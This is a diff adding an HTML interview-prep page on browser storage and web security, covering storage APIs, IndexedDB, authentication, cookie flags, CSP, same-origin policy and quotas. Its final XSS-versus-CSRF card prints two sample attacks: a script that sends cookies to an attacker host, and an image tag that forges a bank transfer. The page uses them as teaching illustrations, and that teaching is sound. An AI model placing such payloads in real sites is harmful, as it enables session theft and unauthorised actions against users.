@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser Storage & Security - Interview Prep</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles/main.css">
+</head>
+
+<body>
+    <!-- Chapter Navigation -->
+    <nav class="chapter-nav">
+        <a href="../index.html" class="chapter-nav-home">← Home</a>
+        <h1 class="chapter-nav-title">Browser Storage & Security</h1>
+        <div class="chapter-nav-controls">
+            <a href="redux.html" class="nav-button">← Previous</a>
+            <a href="performance.html" class="nav-button">Next: Performance & Optimization →</a>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Browser Storage & Security Section -->
+        <section id="browser-storage" class="chapter">
+            <h2 class="chapter-title">Browser Storage & Security</h2>
+
+            <!-- 1. LocalStorage vs SessionStorage vs Cookies -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">1. LocalStorage vs SessionStorage vs Cookies?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>LocalStorage:</strong> Persists forever (5-10MB). <strong>SessionStorage:</strong> Persists
+                    for tab session (5MB). <strong>Cookies:</strong> Sent with requests (4KB).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Cookies are primarily for server-side reading (auth tokens). Storage APIs are for client-side
+                        data. Cookies have security flags (HttpOnly, Secure) that storage APIs lack.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// LocalStorage
+localStorage.setItem('key', 'value');
+localStorage.getItem('key');
+
+// SessionStorage
+sessionStorage.setItem('key', 'value');
+
+// Cookies (Raw JS)
+document.cookie = "username=John Doe; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/";</code></pre>
+                </div>
+            </div>
+
+            <!-- 2. IndexedDB -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">2. What is IndexedDB?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A low-level API for client-side storage of significant amounts of structured data, including
+                    files/blobs.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Unlike LocalStorage (synchronous, string-only), IndexedDB is asynchronous, transactional, and can
+                        store objects. It's ideal for offline apps (PWAs) and caching large datasets.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const request = indexedDB.open("MyDatabase", 1);
+
+request.onupgradeneeded = (event) => {
+  const db = event.target.result;
+  const objectStore = db.createObjectStore("customers", { keyPath: "ssn" });
+  objectStore.createIndex("name", "name", { unique: false });
+};</code></pre>
+                </div>
+            </div>
+
+            <!-- 3. Session vs Token Auth -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">3. Session-based vs Token-based Authentication?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Session:</strong> Server stores state (ID in cookie). <strong>Token (JWT):</strong>
+                    Stateless (data in token).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Sessions are easier to invalidate but require server memory/DB lookups. Tokens scale better (no
+                        server state) but are harder to invalidate (require blocklists or short expiry).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Token (JWT) Header
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+
+// Session Cookie
+Cookie: session_id=1234567890abcdef;</code></pre>
+                </div>
+            </div>
+
+            <!-- 4. Cookie Security Flags -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">4. Explain HttpOnly, Secure, and SameSite cookies.</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Security attributes to protect cookies from theft and misuse.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>HttpOnly:</strong> Cannot be accessed via JavaScript (prevents XSS theft).</li>
+                        <li><strong>Secure:</strong> Only sent over HTTPS.</li>
+                        <li><strong>SameSite:</strong> Controls when cookies are sent with cross-site requests
+                            (Strict/Lax/None) to prevent CSRF.</li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2025 07:28:00 GMT; Secure; HttpOnly; SameSite=Strict</code></pre>
+                </div>
+            </div>
+
+            <!-- 5. Content Security Policy (CSP) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">5. What is Content Security Policy (CSP)?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A security layer that helps detect and mitigate certain types of attacks, including Cross-Site
+                    Scripting (XSS) and data injection attacks.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It allows you to define which dynamic resources are allowed to load (e.g., "only allow scripts
+                        from my domain and google.com"). Defined via HTTP header or <code>&lt;meta&gt;</code> tag.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</code></pre>
+                </div>
+            </div>
+
+            <!-- 6. Same-Origin Policy (SOP) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">6. What is the Same-Origin Policy?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A browser security mechanism that restricts how a document or script loaded from one origin can
+                    interact with a resource from another origin.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Two URLs have the same origin if the protocol, port (if specified), and host are the same. CORS
+                        is the way to relax this policy safely.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Origin: http://store.company.com
+
+http://store.company.com/dir/page.html // Success
+http://store.company.com/dir/other.html // Success
+https://store.company.com/page.html // Failure (Different Protocol)
+http://store.company.com:81/dir/etc.html // Failure (Different Port)
+http://news.company.com/dir/other.html // Failure (Different Host)</code></pre>
+                </div>
+            </div>
+
+            <!-- 7. Storage Quotas -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">7. How do browser storage quotas work?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Browsers limit how much data a site can store. It varies by device and available disk space.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>If the quota is exceeded, the browser may throw a <code>QuotaExceededError</code>. You can check
+                        available space using <code>navigator.storage.estimate()</code>. Browsers may also evict data
+                        under storage pressure (LRU policy).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>if (navigator.storage && navigator.storage.estimate) {
+  const quota = await navigator.storage.estimate();
+  // quota.usage -> used bytes
+  // quota.quota -> available bytes
+  console.log(`Using ${quota.usage} out of ${quota.quota} bytes.`);
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 8. XSS vs CSRF (Refresher) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">8. Quick recap: XSS vs CSRF?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>XSS:</strong> Attacker runs script on your site (steals data). <strong>CSRF:</strong>
+                    Attacker tricks user into doing action on your site (uses user's auth).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>XSS is prevented by sanitization/CSP. CSRF is prevented by Anti-CSRF tokens and SameSite cookies.
+                    </p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// XSS Attack (Malicious Script)
+&lt;script&gt;window.location='http://attacker.com/?cookie='+document.cookie&lt;/script&gt;
+
+// CSRF Attack (Malicious Request)
+&lt;img src="http://bank.com/transfer?to=attacker&amount=1000"&gt;</code></pre>
+                </div>
+            </div>
+        </section>
+
+        
+    </main>
+
+    <!-- Back to Top Button -->
+    <button class="back-to-top" onclick="scrollToTop()">↑</button>
+
+    <script src="../scripts/main.js"></script>
+</body>
+
+</html>
